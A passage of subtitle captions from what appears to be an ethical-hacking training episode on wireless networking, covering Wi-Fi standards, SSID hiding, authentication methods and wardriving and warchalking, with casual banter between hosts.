chart.\n\n499\n00:22:26.540 --> 00:22:28.730\nWe thought it would be a good\nidea to put them together for\n\n500\n00:22:28.730 --> 00:22:31.180\nyou, list the wireless\nstandards on the left.\n\n501\n00:22:31.180 --> 00:22:32.490\nThey were kinda self-explanatory, so\n\n502\n00:22:32.490 --> 00:22:34.780\nwe didn't bother to put\na column header there.\n\n503\n00:22:34.780 --> 00:22:36.160\nWe figured you would know those.\n\n504\n00:22:36.160 --> 00:22:38.890\nAnd then the frequency range\nthat they transmitted.\n\n505\n00:22:38.890 --> 00:22:43.760\nThe modulation mechanism,\nthe OFDM, DSS, whatever it may be,\n\n506\n00:22:43.760 --> 00:22:48.160\nFHSS, although frequency hopping is not on\nthe list cuz we're not using it for these.\n\n507\n00:22:48.160 --> 00:22:51.200\nThe speed in megabits they\ntraditionally will transmit at 1,000\n\n508\n00:22:51.200 --> 00:22:54.300\nthere would obviously be a gigabit,\njust understand that.\n\n509\n00:22:54.300 --> 00:22:56.140\nAnd then the range that they transmit at,\n\n510\n00:22:56.140 --> 00:22:59.590\nin feet with the exception\nof 802.16 which is y-max.\n\n511\n00:22:59.590 --> 00:23:01.320\nWhich is miles as opposed to feet.\n\n512\n00:23:01.320 --> 00:23:02.850\n&gt;&gt; Right.\n&gt;&gt; So just wanna know that, but\n\n513\n00:23:02.850 --> 00:23:04.550\npretty self-explanatory chart.\n\n514\n00:23:04.550 --> 00:23:07.610\nJust thought it would be helpful for\nyou to understand.\n\n515\n00:23:07.610 --> 00:23:10.125\nWe have 802.11abg, right?\n\n516\n00:23:10.125 --> 00:23:14.620\nYou've got 802.11i,\nwhich is WPA2 group of standards there.\n\n517\n00:23:14.620 --> 00:23:16.420\nPretty common today in the enterprise.\n\n518\n00:23:16.420 --> 00:23:19.810\nWhat we've morphed into,\nwith the issues associated with WAP, and\n\n519\n00:23:19.810 --> 00:23:23.115\ninitially WPA, and now WPA2 Enterprise.\n\n520\n00:23:23.115 --> 00:23:26.940\n802.11n, the 16, as I said, is y max.\n\n521\n00:23:26.940 --> 00:23:28.530\nYou have Bluetooth there, as well.\n\n522\n00:23:28.530 --> 00:23:31.820\nWhich is gonna be useful for\npersonal area networks we call PANS.\n\n523\n00:23:31.820 --> 00:23:35.880\nSo you have got your wireless\nnetwork shield around you.\n\n524\n00:23:35.880 --> 00:23:39.450\nI love walking around and seeing people\nwith the whole blue tooth thing.\n\n525\n00:23:39.450 --> 00:23:41.500\nYou've got people with\nthe wireless head set,\n\n526\n00:23:41.500 --> 00:23:46.340\nand they're talking and all that stuff,\nWhich is great, don't get me wrong.\n\n527\n00:23:46.340 --> 00:23:48.040\nIt's not me I don't do that.\n\n528\n00:23:48.040 --> 00:23:49.960\nBut I get it and it makes a lot of sense.\n\n529\n00:23:49.960 --> 00:23:52.812\nYou got the wireless speakers and\nall that stuff now and so\n\n530\n00:23:52.812 --> 00:23:54.485\nit's just kind of interesting.\n\n531\n00:23:54.485 --> 00:23:57.413\nI'm just waiting for\nthe next advent in my world,\n\n532\n00:23:57.413 --> 00:24:01.876\nwhich would be Bluetooth version two or\nversion three which I think should be\n\n533\n00:24:01.876 --> 00:24:04.963\nyou know You get the hologram\nthat projects for you.\n\n534\n00:24:04.963 --> 00:24:08.717\nIt does all that stuff, and so\nyou can just sit at home on the couch,\n\n535\n00:24:08.717 --> 00:24:10.320\nnever have to move.\n\n536\n00:24:10.320 --> 00:24:11.740\nAnd then you remember,\ndid you ever see Wall-E?\n\n537\n00:24:11.740 --> 00:24:13.810\n&gt;&gt; They made a movie about that I think.\n\n538\n00:24:13.810 --> 00:24:14.750\n&gt;&gt; I did see Wall-E, yes,\nall the large people.\n\n539\n00:24:14.750 --> 00:24:15.355\n&gt;&gt; Do you remember.\n\n540\n00:24:15.355 --> 00:24:18.325\nEverybody in the big floating chairs,\nright?\n\n541\n00:24:18.325 --> 00:24:19.155\nOn the spaceship and\n\n542\n00:24:19.155 --> 00:24:23.065\nthey've atrophied because they haven't\nmoved in like a thousand years.\n\n543\n00:24:23.065 --> 00:24:25.767\nSo they're not able to walk,\nthey're just all floating around.\n\n544\n00:24:25.767 --> 00:24:28.850\nAnd so I imagine that's gonna\nwind up being what it is, right?\n\n545\n00:24:28.850 --> 00:24:30.070\nYou're just not gonna do anything.\n\n546\n00:24:30.070 --> 00:24:31.410\nYou're gonna have your doppleganger that's\n\n547\n00:24:31.410 --> 00:24:32.120\nessentially-\n&gt;&gt; Yeah.\n\n548\n00:24:32.120 --> 00:24:35.510\n&gt;&gt; A wireless hologram that\nfollows you everywhere.\n\n549\n00:24:35.510 --> 00:24:37.480\nSo that's what I'm\nenvisioning in the future.\n\n550\n00:24:37.480 --> 00:24:41.551\nThat's right before the Skynet goes live\nand the Matrix is used to power Skynet.\n\n551\n00:24:41.551 --> 00:24:43.311\n&gt;&gt; [LAUGH]\n&gt;&gt; And they all become human batteries.\n\n552\n00:24:43.311 --> 00:24:44.834\nThat's where I think this is all going.\n\n553\n00:24:44.834 --> 00:24:46.024\nMegan voted for that, by the way.\n\n554\n00:24:46.024 --> 00:24:47.330\nMegan said she she was down for that.\n\n555\n00:24:47.330 --> 00:24:48.330\n&gt;&gt; Yeah?\n&gt;&gt; That was, yeah,\n\n556\n00:24:48.330 --> 00:24:50.675\nshe was excited about that possibility.\n\n557\n00:24:50.675 --> 00:24:52.470\n&gt;&gt; [LAUGH]\n&gt;&gt; Which is scary, but\n\n558\n00:24:52.470 --> 00:24:54.330\nthat's what she was saying\nbefore we got started.\n\n559\n00:24:54.330 --> 00:24:57.940\nSo, anyway, let's get back to\nwhat we were talking about.\n\n560\n00:24:57.940 --> 00:24:59.599\nIt's a fun day here at ITProTV.\n\n561\n00:24:59.599 --> 00:25:02.710\n&gt;&gt; It is.\n&gt;&gt; So we were talking about the concepts\n\n562\n00:25:02.710 --> 00:25:05.110\nof just all the different wireless\nnetworks that exist, the standards.\n\n563\n00:25:05.110 --> 00:25:07.660\nYou're gonna throw up the IEEE\nsolutions at some point.\n\n564\n00:25:07.660 --> 00:25:10.270\nJust throw it up in the chat when there's\nsome people, then they can go look it up.\n\n565\n00:25:10.270 --> 00:25:13.290\nJust to be clear I would not\nspend a lot of time going and\n\n566\n00:25:13.290 --> 00:25:16.630\nreading up on every standard, and\nthe intricacies of the working groups.\n\n567\n00:25:16.630 --> 00:25:18.770\nThat's not why we're putting\nthat link up there for you.\n\n568\n00:25:18.770 --> 00:25:20.850\nIt's not necessary for the exam.\n\n569\n00:25:20.850 --> 00:25:23.200\nIt is necessary to know\nthe different standards, right?\n\n570\n00:25:23.200 --> 00:25:26.330\nAnd the information we provided in\nthe table will help you to do that.\n\n571\n00:25:26.330 --> 00:25:29.410\nBut I would not go back and read through\nthe working group standards, and\n\n572\n00:25:29.410 --> 00:25:31.600\nthe notes, and\nall the stuff that comes out of that.\n\n573\n00:25:31.600 --> 00:25:33.350\n&gt;&gt; [LAUGH]\n&gt;&gt; That would not be pertinent for\n\n574\n00:25:33.350 --> 00:25:36.400\nthe exam, you could, but that would\njust not be pertinent for the exam.\n\n575\n00:25:36.400 --> 00:25:38.350\nWould not be absolutely necessary for\nyou to do.\n\n576\n00:25:38.350 --> 00:25:40.060\nLittle extraneous information.\n\n577\n00:25:40.060 --> 00:25:42.740\nWe've talked about\nService Set Identifiers, SSIDs.\n\n578\n00:25:42.740 --> 00:25:44.320\nWhat are the common things\nwe often talk about,\n\n579\n00:25:44.320 --> 00:25:47.020\nfrom a security perspective,\nwith regards to wireless.\n\n580\n00:25:47.020 --> 00:25:50.470\nThis is networking 101,\nsecurity 101 stuff.\n\n581\n00:25:50.470 --> 00:25:52.480\nDon't broadcast the SSID's.\n\n582\n00:25:52.480 --> 00:25:55.060\nHide them, in other words, so\npeople have to know what they are.\n\n583\n00:25:55.060 --> 00:25:57.760\nPeople don't realize that if you don't\nbroadcast them, we can still find them.\n\n584\n00:25:57.760 --> 00:26:01.440\nIt just takes us longer, because we can\nscan the traffic that's coming in and\n\n585\n00:26:01.440 --> 00:26:03.540\nout of the wireless system with a scanner.\n\n586\n00:26:03.540 --> 00:26:04.809\nWe took a look at Cain and\n\n587\n00:26:04.809 --> 00:26:09.380\nAbel in one of the other episodes doing\na little ARP attack and ARP poisoning.\n\n588\n00:26:09.380 --> 00:26:11.440\nAnd when you enable that for wireless use,\n\n589\n00:26:11.440 --> 00:26:13.838\nthat's a great way to\ngrab wireless packets.\n\n590\n00:26:13.838 --> 00:26:16.170\nThere's a NetStumbler, there's Kismet,\n\n591\n00:26:16.170 --> 00:26:18.410\nthere's all these different\nwireless scanners out there.\n\n592\n00:26:18.410 --> 00:26:20.820\nAny or all of them can be\nused to pull down traffic.\n\n593\n00:26:20.820 --> 00:26:25.310\nI actually even have a cool one\nthat works on my Blackberry.\n\n594\n00:26:25.310 --> 00:26:27.640\nI've got an app, believe it or not,\nthat I can use on my Blackberry.\n\n595\n00:26:29.230 --> 00:26:32.191\nSo that way I can sit somewhere and\nI can actually watch wireless packets,\n\n596\n00:26:32.191 --> 00:26:33.450\nI can watch wireless traffic.\n\n597\n00:26:33.450 --> 00:26:36.190\nI can actually look at and\nexamine that stuff.\n\n598\n00:26:36.190 --> 00:26:36.770\nIt's kind of cool.\n\n599\n00:26:36.770 --> 00:26:38.190\n&gt;&gt; Absolutely.\n&gt;&gt; I can actually get some of that\n\n600\n00:26:38.190 --> 00:26:39.370\nwhen I'm on wireless.\n\n601\n00:26:39.370 --> 00:26:41.585\nPeople often forget by the way,\nthat cell phones,\n\n602\n00:26:41.585 --> 00:26:44.090\nalthough they are essentially\ntwo-way radios, and\n\n603\n00:26:44.090 --> 00:26:47.310\nthey do run on a carrier network,\nif you will, traditionally.\n\n604\n00:26:47.310 --> 00:26:50.060\nAnd every one of them today,\nwithout exception, at least all the newer\n\n605\n00:26:50.060 --> 00:26:54.360\nsmartphones, not the traditional analog\nkind of cell phones, the old fashioned\n\n606\n00:26:54.360 --> 00:26:59.190\ncell phones, but the newer digital quote\nunquote version 2 smartphones, right.\n\n607\n00:26:59.190 --> 00:27:02.200\nThat are internet devices along\nwith happening to be a phone.\n\n608\n00:27:02.200 --> 00:27:04.190\nAll of them have wireless capabilities,\nright?\n\n609\n00:27:04.190 --> 00:27:09.200\nAnd so when we connect wirelessly, we're\nusing a wireless network adapter, and\n\n610\n00:27:09.200 --> 00:27:12.120\nwe're connecting the way a normal\ndevice would with wireless.\n\n611\n00:27:12.120 --> 00:27:14.000\nAll the bells, whistles, benefits and\n\n612\n00:27:14.000 --> 00:27:18.260\nalso security liabilities associated with\nwireless can happen on a mobile network.\n\n613\n00:27:18.260 --> 00:27:21.540\nWe're obviously gonna talk about that\nin the mobile discussions we have\n\n614\n00:27:21.540 --> 00:27:25.080\nin the episodes associated with\nhacking mobile devices, as well.\n\n615\n00:27:25.080 --> 00:27:28.500\nBut you have to keep in mind today,\nthese essentially are crossover devices,\n\n616\n00:27:28.500 --> 00:27:31.600\nand as a result of that\nthese sit in both camps.\n\n617\n00:27:31.600 --> 00:27:35.400\nAnd give us the dual opportunity\nof hacking potentially\n\n618\n00:27:35.400 --> 00:27:38.850\non both sides because you can\nhack the mobile device directly.\n\n619\n00:27:38.850 --> 00:27:42.170\nWe're gonna do a demo on that,\nor have done a demo on that,\n\n620\n00:27:42.170 --> 00:27:45.450\nin the mobile device\ndiscussion where we actually\n\n621\n00:27:45.450 --> 00:27:49.290\nshow you how to create an APK file\nusing a net exploit framework exploit.\n\n622\n00:27:49.290 --> 00:27:52.790\nAnd then potentially just load that\napplication file up or load that app up.\n\n623\n00:27:52.790 --> 00:27:54.430\nAnd if you get people to download it,\n\n624\n00:27:54.430 --> 00:27:56.630\nwe've essentially rooted the machine,\nright?\n\n625\n00:27:56.630 --> 00:27:58.355\nAnd so we've been able to root the device.\n\n626\n00:27:58.355 --> 00:28:00.515\nAnd that's not uncommon today,\nby any means.\n\n627\n00:28:00.515 --> 00:28:04.725\nYou we also can do it on the wireless\nside very easily, whether it's mobile\n\n628\n00:28:04.725 --> 00:28:08.365\nconnecting over the cell network, or\nit's wireless, we can do it either way.\n\n629\n00:28:08.365 --> 00:28:11.385\nIf we compromise the app store,\ncompromise the integrity the device.\n\n630\n00:28:11.385 --> 00:28:13.605\nIf you jailbreak or root the devices.\n\n631\n00:28:13.605 --> 00:28:15.275\nIt's jailroot, I'm creating a new word.\n\n632\n00:28:15.275 --> 00:28:20.295\nA hybrid of jailbreaking and\nrooting, called JRB, jailroot break.\n\n633\n00:28:20.295 --> 00:28:22.540\nIf you jailbreak or root the device,\n\n634\n00:28:22.540 --> 00:28:26.280\nyou can actually see this\nkind of behavior happening.\n\n635\n00:28:26.280 --> 00:28:30.110\nSo there's a lot of stuff that goes on in\nthese discussions and in this particular\n\n636\n00:28:30.110 --> 00:28:35.320\narea now, because these devices really\nexist as two distinct form factors in one.\n\n637\n00:28:35.320 --> 00:28:38.260\nThey cross both divides and\nas security professionals,\n\n638\n00:28:38.260 --> 00:28:42.033\nas ethical hackers ultimately, and\nas certainly the bad actors that\n\n639\n00:28:42.033 --> 00:28:45.110\nare coming in behind the scenes trying\nto take advantage of our networks.\n\n640\n00:28:45.110 --> 00:28:47.930\nWe know this, we should know this,\nwe should pay attention to this and\n\n641\n00:28:47.930 --> 00:28:51.590\nwe have to understand the traditional MDM,\nMobile Device Management may or\n\n642\n00:28:51.590 --> 00:28:55.790\nmay not be enough to counteract some of\nthese issues when we enable wireless.\n\n643\n00:28:55.790 --> 00:28:56.940\nAnd that's a separate conversation.\n\n644\n00:28:56.940 --> 00:29:00.410\nWe'll have that in\nthe Hacking Mobile episodes,\n\n645\n00:29:00.410 --> 00:29:04.320\nbut just pointing out as we talk about\nit here that it's a crossover, and\n\n646\n00:29:04.320 --> 00:29:06.100\nit's one of those things we\nhave to obviously be aware of.\n\n647\n00:29:06.100 --> 00:29:08.690\nSo think about SSIDs,\nyou know we traditionally, as I said,\n\n648\n00:29:08.690 --> 00:29:09.830\ndo not broadcast them.\n\n649\n00:29:09.830 --> 00:29:13.670\nWe should make them available to users\nthat are authorized to see the system.\n\n650\n00:29:13.670 --> 00:29:16.000\nIt should not be the only\nline of defense by the way.\n\n651\n00:29:16.000 --> 00:29:17.740\nIf you know the SSID you're in, right.\n\n652\n00:29:17.740 --> 00:29:18.560\nWe need more than that.\n\n653\n00:29:18.560 --> 00:29:20.250\nHopefully we know that.\n\n654\n00:29:20.250 --> 00:29:21.390\nThey should be.\n\n655\n00:29:21.390 --> 00:29:23.100\nPeople go back and forth,\nthey hear this all the time.\n\n656\n00:29:23.100 --> 00:29:24.880\nShould they be complex?\n\n657\n00:29:24.880 --> 00:29:26.470\nShould they be easy?\n\n658\n00:29:26.470 --> 00:29:29.640\nSSID's are nothing but a descriptive\ntag that you use to associate.\n\n659\n00:29:29.640 --> 00:29:32.000\nThey have no security value in and\nof themselves,\n\n660\n00:29:32.000 --> 00:29:35.120\ncomplex versus simple,\nthere’s no additional value there.\n\n661\n00:29:35.120 --> 00:29:38.333\nYou're not gaining anything by making them\nrandom and obtuse, you’re just making-\n\n662\n00:29:38.333 --> 00:29:39.185\n&gt;&gt; You're just making it more\n\n663\n00:29:39.185 --> 00:29:39.819\ndifficult, yeah.\n\n664\n00:29:39.819 --> 00:29:40.474\n&gt;&gt; It harder to type in.\n\n665\n00:29:40.474 --> 00:29:43.543\n&gt;&gt; And so if anything, you've pissed\nthe hacker off and made it harder for\n\n666\n00:29:43.543 --> 00:29:44.390\nthem to get in.\n\n667\n00:29:44.390 --> 00:29:46.380\nAnd now they're really gonna\nwant to hurt you, right?\n\n668\n00:29:46.380 --> 00:29:47.940\n&gt;&gt; Yeah.\n&gt;&gt; As opposed to, let me in or\n\n669\n00:29:47.940 --> 00:29:49.148\nsomething easy so.\n\n670\n00:29:49.148 --> 00:29:52.493\n&gt;&gt; And your end-users that are supposed\nto be connecting to it are like wait was\n\n671\n00:29:52.493 --> 00:29:54.020\nthat a capital e, @ symbol, 1?\n\n672\n00:29:54.020 --> 00:29:54.850\n&gt;&gt; Yeah,\nwe don't really care about them though.\n\n673\n00:29:54.850 --> 00:29:56.264\n&gt;&gt; Yeah.\n&gt;&gt; We want to make their life difficult,\n\n674\n00:29:56.264 --> 00:29:59.021\nbut we don't want to piss off the hackers\ncuz those are the people that can hurt us.\n\n675\n00:29:59.021 --> 00:30:01.140\n&gt;&gt; [LAUGH]\n&gt;&gt; But the point here,\n\n676\n00:30:01.140 --> 00:30:02.510\nand Mike raises a good point.\n\n677\n00:30:02.510 --> 00:30:05.930\nI am tongue-in-cheek at certain\npoints in our conversation.\n\n678\n00:30:05.930 --> 00:30:08.490\nBut, the reality is, yes,\nwe don't want to inconvenience our users,\n\n679\n00:30:08.490 --> 00:30:11.110\nyou're absolutely right, and\nthat is a legitimate issue.\n\n680\n00:30:11.110 --> 00:30:12.360\nBut, in addition,\n\n681\n00:30:12.360 --> 00:30:17.860\nwe want to make sure that we understand\nthat creating our complex SSID has this,\n\n682\n00:30:17.860 --> 00:30:21.520\nzero, right here, this amount, you can't\nsee my eye but if I do that maybe.\n\n683\n00:30:21.520 --> 00:30:27.180\nYou cannot see, but\nzero additional security benefit to us.\n\n684\n00:30:27.180 --> 00:30:29.490\nIt's a question of whether\nwe broadcast it or not and\n\n685\n00:30:29.490 --> 00:30:31.870\nif we make it freely available,\nit's easier to find.\n\n686\n00:30:31.870 --> 00:30:35.310\nIf we don't, it's a small incremental\nlittle bump in the road and\n\n687\n00:30:35.310 --> 00:30:40.196\nmay prevent drive-by and random\nlooky-loo kind of attacks where people\n\n688\n00:30:40.196 --> 00:30:43.170\nare just curious, because they don't wanna\ngo to the trouble of figuring it out.\n\n689\n00:30:43.170 --> 00:30:46.280\nBut it has no value out beyond that.\n\n690\n00:30:46.280 --> 00:30:48.360\nSo keep in mind,\nwe wanna focus our efforts and\n\n691\n00:30:48.360 --> 00:30:52.010\ncomplexity on things like passwords,\namping up our encryption,\n\n692\n00:30:52.010 --> 00:30:55.920\nusing stronger encryption algorithms,\nbigger key spaces, larger IVs.\n\n693\n00:30:55.920 --> 00:31:01.230\nThese are the things where complexity\nmatters, not the name of the SSID.\n\n694\n00:31:01.230 --> 00:31:02.980\nIt's just totally irrelevant.\n\n695\n00:31:02.980 --> 00:31:06.500\nI hear people say that and I take issue\nwith it because it's just not true,\n\n696\n00:31:06.500 --> 00:31:09.740\nand I wanna make sure you understand that,\nand that you're aware of that.\n\n697\n00:31:09.740 --> 00:31:12.210\nSo, make sure we understand\nthe thought process there.\n\n698\n00:31:12.210 --> 00:31:15.250\nIt is important but it's important for\na very specific reason.\n\n699\n00:31:15.250 --> 00:31:18.910\nTruly just hiding in plain sight versus\nmaking it easy for people to see you.\n\n700\n00:31:18.910 --> 00:31:20.875\nSpeaking of which,\nWi-Fi authentication method.\n\n701\n00:31:20.875 --> 00:31:22.810\nSo, two types we should think about.\n\n702\n00:31:22.810 --> 00:31:24.920\nWe have what's called\nOpen System Authentication.\n\n703\n00:31:24.920 --> 00:31:28.080\nThis is just wide open,\nyou can essentially associate.\n\n704\n00:31:28.080 --> 00:31:29.950\nNo big deal, very easy.\n\n705\n00:31:29.950 --> 00:31:31.500\nNo password, in other words.\n\n706\n00:31:31.500 --> 00:31:34.460\nIt's just you, have the SSID,\nyou connect and you're in.\n\n707\n00:31:34.460 --> 00:31:37.510\nYou just go through the formal association\nprocess, but there's really nothing there,\n\n708\n00:31:37.510 --> 00:31:40.540\nother than some packet exchanges\nthat occur very quickly.\n\n709\n00:31:40.540 --> 00:31:44.300\nAnd then we have what's known\nas Shared Key Authentication.\n\n710\n00:31:44.300 --> 00:31:47.010\nThis is where you actually\nhave to have a password or\n\n711\n00:31:47.010 --> 00:31:52.300\nsome form of understanding of how to\nassociate, we have to put that in.\n\n712\n00:31:52.300 --> 00:31:55.140\nThis could be the sometimes\ncalled the pre-shared key,\n\n713\n00:31:55.140 --> 00:31:58.648\nsometimes called the secret key,\nsometimes called the network key.\n\n714\n00:31:58.648 --> 00:31:59.741\nYou hear it referred to and\n\n715\n00:31:59.741 --> 00:32:03.176\nused differently by different vendors as\nyou go through their little interface.\n\n716\n00:32:03.176 --> 00:32:08.520\nBut it's when you connect on your little\nwireless SSID item in your wireless list.\n\n717\n00:32:08.520 --> 00:32:09.590\nAnd it says okay, connect.\n\n718\n00:32:09.590 --> 00:32:12.340\nYou connect and it pops up and\nsays enter the pass phrase or\n\n719\n00:32:12.340 --> 00:32:13.440\nanother key, or whatever.\n\n720\n00:32:13.440 --> 00:32:15.150\nThat's where you need to put that in.\n\n721\n00:32:15.150 --> 00:32:17.670\nSo two types,\nshould definitely know what they are.\n\n722\n00:32:17.670 --> 00:32:19.491\nOpen system and shared key, right.\n\n723\n00:32:19.491 --> 00:32:21.280\nI wanna make sure we're\nfamiliar with those.\n\n724\n00:32:21.280 --> 00:32:24.790\nKeep in mind we may be doing this against\nwhat's called a centralized authentication\n\n725\n00:32:24.790 --> 00:32:25.680\narchitecture.\n\n726\n00:32:25.680 --> 00:32:28.200\nWe may be going back as we've\ntalked about it often and\n\n727\n00:32:28.200 --> 00:32:30.775\nI made a reference as we got\nstarted with this conversation.\n\n728\n00:32:30.775 --> 00:32:33.795\nTo the fact that this are really\nhybrid systems that teetered,\n\n729\n00:32:33.795 --> 00:32:36.780\nwired back to central\ncourse traditionally.\n\n730\n00:32:36.780 --> 00:32:40.630\nSo, we access LDAP directory\nservices a lot of the time, right?\n\n731\n00:32:40.630 --> 00:32:44.799\nSo, we're gonna be seeing a wireless\nconnection coming through a wireless\n\n732\n00:32:44.799 --> 00:32:48.769\ngateway through some sort of access\npoint back into the wire core hitting\n\n733\n00:32:48.769 --> 00:32:52.740\nour LDAP servers authenticating,\nnot just the permission required and\n\n734\n00:32:52.740 --> 00:32:55.734\nthe password required to\nconnect to the wireless, but\n\n735\n00:32:55.734 --> 00:32:59.604\nnow authenticating the user credential,\nthe way we would normally.\n\n736\n00:32:59.604 --> 00:33:03.594\nRight setting, the user name and password\nhash or whatever multi-factor forms of\n\n737\n00:33:03.594 --> 00:33:07.715\nauthentication we're requiring,\nthat traffic is all going back and forth.\n\n738\n00:33:07.715 --> 00:33:11.265\nSo keep in mind, that we may be\nauthenticating through a central\n\n739\n00:33:11.265 --> 00:33:15.275\ncore separately from just\nproviding the shared key.\n\n740\n00:33:15.275 --> 00:33:16.375\nthe association key, right?\n\n741\n00:33:16.375 --> 00:33:18.130\nThat will be one way to do this.\n\n742\n00:33:18.130 --> 00:33:22.143\nWe could use digital certificates, so we\ncan use our public private key asymmetric\n\n743\n00:33:22.143 --> 00:33:26.090\nsolution with digital certificates\nrepresenting the public key part of that.\n\n744\n00:33:26.090 --> 00:33:30.010\nPrivate key stored traditionally in\nthe LDAP directory to do authentication,\n\n745\n00:33:30.010 --> 00:33:32.170\neven wireless systems we can do that.\n\n746\n00:33:32.170 --> 00:33:34.585\nWe may use token based\nchallenge in response.\n\n747\n00:33:34.585 --> 00:33:37.070\nThere's all these different\nways that we can bolt on.\n\n748\n00:33:37.070 --> 00:33:40.937\nBut at the end of the day, right, you're\nproviding different levels of credentials,\n\n749\n00:33:40.937 --> 00:33:42.987\nyou're providing an association password.\n\n750\n00:33:42.987 --> 00:33:45.971\nAnd then you're providing an LDAP\ncredential traditionally on top of that.\n\n751\n00:33:45.971 --> 00:33:50.094\nAnd here's a little, just making sure we\nunderstand right the architecture and\n\n752\n00:33:50.094 --> 00:33:51.800\nthe hybrid nature of that there.\n\n753\n00:33:51.800 --> 00:33:55.330\nLet's talk about how we find\nwireless access points and\n\n754\n00:33:55.330 --> 00:33:57.990\nhow we find open versus closed access.\n\n755\n00:33:57.990 --> 00:34:01.080\nHere we can think about the old school way\nof doing this would have be what we called\n\n756\n00:34:01.080 --> 00:34:01.868\nworld dialing.\n\n757\n00:34:01.868 --> 00:34:06.050\nAnd we talked about that in some of the\nprior episodes and I know I've probably\n\n758\n00:34:06.050 --> 00:34:09.620\nmade my reference to war games, the\ntraditional reference that I use for that.\n\n759\n00:34:09.620 --> 00:34:11.800\nWhat would life be without\nmovies to talk about?\n\n760\n00:34:11.800 --> 00:34:13.480\nAnd it's funny,\nbecause I don't really watch-\n\n761\n00:34:13.480 --> 00:34:14.630\n&gt;&gt; Like ten minute episodes.\n\n762\n00:34:14.630 --> 00:34:16.040\n&gt;&gt; I just don't watch a lot of TV.\n\n763\n00:34:16.040 --> 00:34:16.990\nI watch a lot of movies.\n\n764\n00:34:16.990 --> 00:34:18.810\nI don't tend to watch a lot of TV.\n\n765\n00:34:18.810 --> 00:34:21.350\nExcept around certain times,\nlike with the Olympics or whatever.\n\n766\n00:34:21.350 --> 00:34:22.900\nBut, I don't tend to watch a lot of TV.\n\n767\n00:34:22.900 --> 00:34:26.690\nGiven the amount of traveling I do,\nas well, I'm constantly on the go.\n\n768\n00:34:26.690 --> 00:34:29.140\nI am in places where in theory I could,\nbut\n\n769\n00:34:29.140 --> 00:34:31.590\nI tend to spend a lot of\ntime just watching movies.\n\n770\n00:34:31.590 --> 00:34:32.422\nAnd so as a result,\n\n771\n00:34:32.422 --> 00:34:35.760\nmost of my references as you well know\nif you've listed to some of our chats.\n\n772\n00:34:35.760 --> 00:34:37.744\n&gt;&gt; [LAUGH]\n&gt;&gt; Our fireside chats, Mike and I,\n\n773\n00:34:37.744 --> 00:34:38.670\nare about movies.\n\n774\n00:34:38.670 --> 00:34:41.980\nAnd tend to be about older movies, so\nalthough I do watch new ones on occasion.\n\n775\n00:34:41.980 --> 00:34:44.810\nAs I rant at I think, on some of our\nearlier episodes, about the remake issue.\n\n776\n00:34:44.810 --> 00:34:46.617\n&gt;&gt; Yes, yes.\n&gt;&gt; And how they screwed up Benhur and\n\n777\n00:34:46.617 --> 00:34:48.275\nIndependence Day and all that stuff.\n\n778\n00:34:48.275 --> 00:34:50.791\nSo, when we think about word value,\n\n779\n00:34:50.791 --> 00:34:55.991\nthe old school way of hacking through\na modem, we update that in wireless and\n\n780\n00:34:55.991 --> 00:35:00.980\nwe talk about WarDriving,\nWarWalking, WarChalking, WarFlying.\n\n781\n00:35:00.980 --> 00:35:03.000\nThere's all these different\nways to do this but\n\n782\n00:35:03.000 --> 00:35:07.090\nessentially all of these mechanisms\nare centered around gathering wireless\n\n783\n00:35:07.090 --> 00:35:11.690\nsignals while on the move somewhere,\nand then trying to use them and\n\n784\n00:35:11.690 --> 00:35:14.760\ncheck whether they open or\nnot to be able to probe and get in.\n\n785\n00:35:14.760 --> 00:35:18.770\nSo WarWalking, it's literal, just\nwalking around with a wireless device.\n\n786\n00:35:18.770 --> 00:35:20.356\nWe do this when we do site surveys,\n\n787\n00:35:20.356 --> 00:35:23.985\nalthough we don't often think about it\nthis way, but we do a wireless survey.\n\n788\n00:35:23.985 --> 00:35:26.980\nA wireless site survey, your WarWalking,\nyour walking around looking at\n\n789\n00:35:26.980 --> 00:35:29.465\nthe perimeter areas and\ncreating the coverage maps, right?\n\n790\n00:35:29.465 --> 00:35:33.628\nThe big zone maps we see with the bull's\neyes, with the wireless signals and\n\n791\n00:35:33.628 --> 00:35:35.510\nthe rain from the strength.\n\n792\n00:35:35.510 --> 00:35:37.965\nWe do this through WarWalking,\nwe walk through and\n\n793\n00:35:37.965 --> 00:35:41.905\nlook at the outer protection ring and come\nbackwards and said to judge the strength\n\n794\n00:35:41.905 --> 00:35:45.241\nwith maybe a fluke analyzer or\nnetwork capable machine or whatever.\n\n795\n00:35:45.241 --> 00:35:47.970\nWarChalking is the idea\nfinding open access points,\n\n796\n00:35:47.970 --> 00:35:50.350\nyou see this a lot in downtown corridors.\n\n797\n00:35:50.350 --> 00:35:53.270\nSo in financial districts,\nthings like that in major cities.\n\n798\n00:35:53.270 --> 00:35:56.230\nIf you look on the sides of buildings or\non the street, or on street\n\n799\n00:35:56.230 --> 00:36:00.030\nsigns in front, you have to know where to\nlook and kind of have a sense of this.\n\n800\n00:36:00.030 --> 00:36:01.990\nAnd by the way, you can go on Google.\n\n801\n00:36:01.990 --> 00:36:04.420\nWe're not gonna put up all the signals,\nbut\n\n802\n00:36:04.420 --> 00:36:08.309\nthere is a whole graffiti sub language\nthat is used with WarChalking.\n\n803\n00:36:08.309 --> 00:36:11.810\nAnd if your interested, and then go and\nGoogle WarChalking symbols.\n\n804\n00:36:11.810 --> 00:36:16.210\nYou will find that there is 30 or\n40 different symbols that are used,\n\n805\n00:36:16.210 --> 00:36:19.930\nthat you will find spray painted, or\nmarked, they're not chalked traditionally,\n\n806\n00:36:19.930 --> 00:36:22.170\nyet we're really talking about\nthem being permanently marked.\n\n807\n00:36:22.170 --> 00:36:24.006\nBut you will see them in these areas.\n\n808\n00:36:24.006 --> 00:36:26.179\nAnd if you start to look for them,\nyou know what they look like,\n\n809\n00:36:26.179 --> 00:36:27.286\nyou will see these symbols, and\n\n810\n00:36:27.286 --> 00:36:30.420\nyou may have walked right by them 1,000\ntimes, not realize what they were.\n\n811\n00:36:30.420 --> 00:36:34.680\nBut if for people that know, they are\nessentially marking open wireless access\n\n812\n00:36:34.680 --> 00:36:38.640\npoints in marking specifically,\ncertain types of access points that\n\n813\n00:36:38.640 --> 00:36:41.940\nare opened in certain ways or have certain\ncapabilities associated with them.\n\n814\n00:36:41.940 --> 00:36:45.849\nNow, as with everything with technology\ntoday, we have an app for that, so\n\n815\n00:36:45.849 --> 00:36:47.329\nyou actually can go online.\n\n816\n00:36:47.329 --> 00:36:51.228\nI do this a lot when I travel, I probably\nmentioned this in episode before I'm sure.\n\n817\n00:36:51.228 --> 00:36:54.530\nAlthough maybe not specifically in\nthe CH conversations we're having, but\n\n818\n00:36:54.530 --> 00:36:57.278\nI do this a lot when I 